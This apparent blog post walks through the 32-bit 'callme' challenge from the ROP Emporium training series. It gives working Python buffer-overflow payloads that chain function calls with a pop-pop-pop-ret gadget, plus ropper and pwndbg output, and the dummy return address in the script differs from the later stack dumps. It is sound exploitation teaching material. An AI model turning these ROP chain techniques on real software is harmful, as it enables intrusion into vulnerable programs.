---
title: "ROP Emporium - callme"
categories: [Binary, Exploitation]
tags: [x86, x86-64, ARMv5, ARM, MIPS]
---

Welcome back, fellow hackers! In today’s post, we’ll dive into solving the **“callme”** challenge from the amazing **ROP Emporium** series.

In this challenge, we’re given a vulnerable binary compiled for **x86 (32-bit)**. Our goal is to call three specific functions — **callme_one()**, **callme_two()**, and **callme_three()** — **in that order**, each with the following three arguments:

```txt
0xdeadbeef, 0xcafebabe, 0xd00df00d
```

If we successfully execute these calls in the correct order with the right arguments, the binary will print the flag for us.


Running `objdump -d callme32` or using `nm` shows us the addresses of the three required functions:

```bash
objdump -d callme32  | grep callme_
080484e0 <callme_three@plt>:
080484f0 <callme_one@plt>:
08048550 <callme_two@plt>:
#...
```

They are available via the Procedure Linkage Table (PLT), meaning we can call them directly via ROP.

We need to call:
```c
callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)
callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d)
callme_three(0xdeadbeef, 0xcafebabe, 0xd00df00d)
```

Here, I would like to tell you about ROP gadgets.

In Return-Oriented Programming (ROP), **gadgets** are small sequences of machine instructions **already present in the binary** (or linked libraries) that end with a `ret` instruction. These gadgets let us control the flow of the program by "returning" to different places in memory, effectively chaining together tiny code snippets to perform arbitrary operations — without injecting any code!

For finding the offset to `EIP` you can follow my last two blogs.

I will skip that part here.
We got offset `44` bytes for overwriting `EIP`.

In **x86 (32-bit)**, arguments are passed via the **stack**:

- You push arguments onto the stack.
- The `ret` instruction pops the next value from the stack into the instruction pointer (EIP).

We can't use our approach like:
```txt
callme_one
callme_two # <- return here
0xdeadbeef # <- arg1
0xcafebabe # <- arg2
0xd00df00d # <- arg3
```


- When `callme_one` returns, it pops `callme_two` as the return address — that's fine.
- But now, when `callme_two` executes, it expects **arguments on the stack** (since x86 uses the stack for arguments).
- However, the stack at that point now contains **your arguments meant for `callme_one`**, and they’re in the wrong position for `callme_two`. The stack has become misaligned, because the previous function didn’t clean up the stack properly.
- Also, after `callme_two` finishes, it will try to `ret` again — but there’s no valid return address after your arguments, leading to a crash.

To help you truly understand why we **can’t just chain function calls directly** in **x86 ROP**, let’s demonstrate it with an actual example.

Here’s a simple exploit script I wrote for the _callme_ challenge (32-bit):

```python
#!/usr/bin/python3
import sys
import struct

payload = b'A' * 40                     # Padding to overflow buffer (40 bytes)
payload += b'B' * 4                     # Overwrite saved EBP (optional placeholder)
payload += struct.pack("<I", 0x080484f0) # Address of callme_one function
payload += struct.pack("<I", 0x08048550) # Address of callme_two function (intended as "return" address)
payload += struct.pack("<I", 0xdeadbeef) # arg1 for callme_one
payload += struct.pack("<I", 0xcafebabe) # arg2 for callme_one
payload += struct.pack("<I", 0xd00df00d) # arg3 for callme_one

payload += struct.pack("<I", 0x44444444) # arg1 for callme_two (intended)
payload += struct.pack("<I", 0x55555555) # arg2 for callme_two (intended)
payload += struct.pack("<I", 0x66666666) # arg3 for callme_two (intended)

sys.stdout.buffer.write(payload)

```

We’ll run the binary with this payload in GDB to inspect the stack behavior carefully.

```bash
pwndbg> b callme_one
Breakpoint 1 at 0x80484f0
pwndbg> b callme_two
Breakpoint 2 at 0x8048550
pwndbg> r < exp.txt 
```

At first breakpoint (`callme_one`), everything _seems_ fine at first glance:

```bash
pwndbg> stack 6
00:0000│ esp 0xffffd4f8 —▸ 0xf7f8d000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
01:0004│ ebp 0xffffd4fc ◂— 0x42424242 ('BBBB')
02:0008│+004 0xffffd500 —▸ 0x8048550 (callme_two@plt) ◂— jmp dword ptr [0x804a030]
03:000c│+008 0xffffd504 ◂— 0xdeadbeef
04:0010│+00c 0xffffd508 ◂— 0xcafebabe
05:0014│+010 0xffffd50c ◂— 0xd00df00d
```

- We landed in `callme_one` successfully.
- The stack has the intended return address (which is `callme_two`).
- Arguments for `callme_one` are right after it.

Now, we resume execution:

```bash
pwndbg> c
```

Let’s inspect the stack again:

```bash
pwndbg> stack 8
00:0000│ esp 0xffffd4f8 —▸ 0xf7f8d000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
01:0004│-004 0xffffd4fc —▸ 0xffffd5d4 —▸ 0xffffd7a2 ◂— '/home/fury/Desktop/Challs/CTF/pwn/rop_emporium/3-callme/1-32bit/callme32'
02:0008│ ebp 0xffffd500 ◂— 0x42424242 ('BBBB')
03:000c│+004 0xffffd504 ◂— 0xdeadbeef
04:0010│+008 0xffffd508 ◂— 0xcafebabe
05:0014│+00c 0xffffd50c ◂— 0xd00df00d
06:0018│+010 0xffffd510 ◂— 0x44444444 ('DDDD')
07:001c│+014 0xffffd514 ◂— 0x55555555 ('UUUU')

```


##### ⚠️ Oops! Problem Detected:

Even though we jumped to `callme_two`, the arguments on the stack are now **misaligned**:

- `callme_two` doesn’t automatically receive `0x44444444`, `0x55555555`, and `0x66666666` as arguments.
- The stack still contains leftover data from `callme_one`'s call.

In fact, `callme_two` now treats previous function arguments or junk as its arguments, leading to incorrect behavior or crashes.


- The `ret` instruction doesn’t magically align the stack for us. It just pops the return address and resumes execution — leaving old arguments on the stack.
- In our case, after `callme_one` returns, it jumps to `callme_two`, but the stack is still polluted with old arguments intended for `callme_one`.

To fix this, we must **manually clean up the stack** after each function call.

We need to use gadgets like:

```txt
pop [ ] ; pop [ ] ; pop [ ] ; ret
```

This gadget pops off three values (i.e., the old arguments) from the stack after each function call, preparing the stack for the next call.

So, in place of calling `callme_two` we will call our gadget which will remote three values from the stack.

For searching gadgets we will use `ropper` a gadget hunting tool.

```bash
ropper --file callme32 --search "pop"
#...
0x080487f9: pop esi; pop edi; pop ebp; ret; 
#...
```

Now that we’ve understood why we can’t chain function calls directly, let's see the **correct approach** using a **stack-cleaning gadget** (also called `pop-pop-pop-ret`).

We’ve found a suitable gadget at `0x080487f9` using **ropper**.
This gadget pops **three values** from the stack (into `esi`, `edi`, and `ebp` — we don’t care about these registers here), and then returns to the next address on the stack.  
It’s perfect for cleaning up our arguments after each function call.

```python
#!/usr/bin/python3
import sys
import struct

payload = b'A' * 40                      # Buffer overflow padding (40 bytes)
payload += b'B' * 4                      # Overwrite saved EBP (optional placeholder)

# Call callme_one with arguments
payload += struct.pack("<I", 0x080484f0)  # callme_one address
payload += struct.pack("<I", 0x080487f9)  # pop3ret gadget (stack cleanup)
payload += struct.pack("<I", 0xdeadbeef)  # arg1
payload += struct.pack("<I", 0xcafebabe)  # arg2
payload += struct.pack("<I", 0xd00df00d)  # arg3

# Call callme_two with arguments
payload += struct.pack("<I", 0x08048550)  # callme_two address
payload += struct.pack("<I", 0x080487f9)  # pop3ret gadget
payload += struct.pack("<I", 0xdeadbeef)  # arg1
payload += struct.pack("<I", 0xcafebabe)  # arg2
payload += struct.pack("<I", 0xd00df00d)  # arg3

# Call callme_three with arguments
payload += struct.pack("<I", 0x080484e0)  # callme_three address
payload += struct.pack("<I", 0xaabbccdd)  # Dummy return address 
payload += struct.pack("<I", 0xdeadbeef)  # arg1
payload += struct.pack("<I", 0xcafebabe)  # arg2
payload += struct.pack("<I", 0xd00df00d)  # arg3

sys.stdout.buffer.write(payload)

```

We’ll now run this payload in GDB and set breakpoints at:

- `callme_one`
- `callme_two`
- `callme_three`
- The `pop3ret` gadget (`0x080487f9`)

```bash
python exp.py > exp.txt
gdb ./callme32
```

Set breakpoints:

```bash
pwndbg> b callme_three
Breakpoint 1 at 0x80484e0
pwndbg> b callme_two
Breakpoint 2 at 0x8048550
pwndbg> b callme_one
Breakpoint 3 at 0x80484f0
pwndbg> b *0x080487f9
Breakpoint 4 at 0x80487f9
```

Run the exploit:

```bash
pwndbg> run < exp.txt

#...
Breakpoint 3, 0xf7fbb641 in callme_one () from ./libcallme32.so

```

Let's analyze the stack -

```bash
pwndbg> stack 6
00:0000│ esp 0xffffd4f8 —▸ 0xf7f8d000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
01:0004│ ebp 0xffffd4fc ◂— 0x42424242 ('BBBB')
02:0008│+004 0xffffd500 —▸ 0x80487f9 (__libc_csu_init+89) ◂— pop esi
03:000c│+008 0xffffd504 ◂— 0xdeadbeef
04:0010│+00c 0xffffd508 ◂— 0xcafebabe
05:0014│+010 0xffffd50c ◂— 0xd00df00d
```

Stack is clean: we’ll return to `pop3ret` after `callme_one`, with correct arguments below it.

```bash
pwndbg> stack 6
00:0000│ esp 0xffffd4f8 —▸ 0xf7f8d000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
01:0004│ ebp 0xffffd4fc ◂— 0x42424242 ('BBBB')
02:0008│+004 0xffffd500 —▸ 0x80487f9 (__libc_csu_init+89) ◂— pop esi
03:000c│+008 0xffffd504 ◂— 0xdeadbeef
04:0010│+00c 0xffffd508 ◂— 0xcafebabe
05:0014│+010 0xffffd50c ◂— 0xd00df00d

Breakpoint 4, 0x080487f9 in __libc_csu_init ()
 ► 0x80487f9  <__libc_csu_init+89>       pop    esi     ESI => 0xdeadbeef
   0x80487fa  <__libc_csu_init+90>       pop    edi     EDI => 0xcafebabe
   0x80487fb  <__libc_csu_init+91>       pop    ebp     EBP => 0xd00df00d
   0x80487fc  <__libc_csu_init+92>       ret                                <callme_two@plt>

```

Stack gets popped cleanly:

- Pops `0xdeadbeef` → `esi`
- Pops `0xcafebabe` → `edi`
- Pops `0xd00df00d` → `ebp`
- Then `ret` jumps to `callme_two`.

```bash
pwndbg> c
#..
Breakpoint 2, 0xf7fbb75a in callme_two () from ./libcallme32.so
#..
pwndbg> stack 6
00:0000│ esp 0xffffd508 —▸ 0xf7f8d000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
01:0004│-004 0xffffd50c ◂— 0xdeadbeef
02:0008│ ebp 0xffffd510 ◂— 0xd00df00d
03:000c│+004 0xffffd514 —▸ 0x80487f9 (__libc_csu_init+89) ◂— pop esi
04:0010│+008 0xffffd518 ◂— 0xdeadbeef
05:0014│+00c 0xffffd51c ◂— 0xcafebabe

```

Same clean state again! Once `callme_two` finishes, it’ll again jump to `pop3ret` for stack cleanup.

```bash
pwndbg> c
 ► 0x80487f9  <__libc_csu_init+89>       pop    esi     ESI => 0xdeadbeef
   0x80487fa  <__libc_csu_init+90>       pop    edi     EDI => 0xcafebabe
   0x80487fb  <__libc_csu_init+91>       pop    ebp     EBP => 0xd00df00d
   0x80487fc  <__libc_csu_init+92>       ret                                <callme_three@plt>

```

```bash
pwndbg> stack 6
00:0000│ esp 0xffffd518 ◂— 0xdeadbeef
01:0004│     0xffffd51c ◂— 0xcafebabe
02:0008│     0xffffd520 ◂— 0xd00df00d
03:000c│     0xffffd524 —▸ 0x80484e0 (callme_three@plt) ◂— jmp dword ptr [0x804a014]
04:0010│     0xffffd528 ◂— 0xbadbad
05:0014│     0xffffd52c ◂— 0xdeadbeef

```

```bash
pwndbg> c
Breakpoint 1, 0xf7fbb85a in callme_three () from ./libcallme32.so

pwndbg> stack 6
00:0000│ esp 0xffffd51c —▸ 0xf7f8d000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
01:0004│-004 0xffffd520 ◂— 0xdeadbeef
02:0008│ ebp 0xffffd524 ◂— 0xd00df00d
03:000c│+004 0xffffd528 ◂— 0xbadbad
04:0010│+008 0xffffd52c ◂— 0xdeadbeef
05:0014│+00c 0xffffd530 ◂— 0xcafebabe

```

All functions were called in order with correct arguments!

This is exactly how **stack cleanup gadgets** allow us to chain multiple function calls safely in **x86 (32-bit)** ROP exploits:

1. **Call the target function.**
2. Use a **`pop N; ret`** gadget (where `N` = number of arguments) to clean up the stack after the function returns.
3. Provide arguments for the next function call on the stack.
4. **Repeat** this process for every chained function.


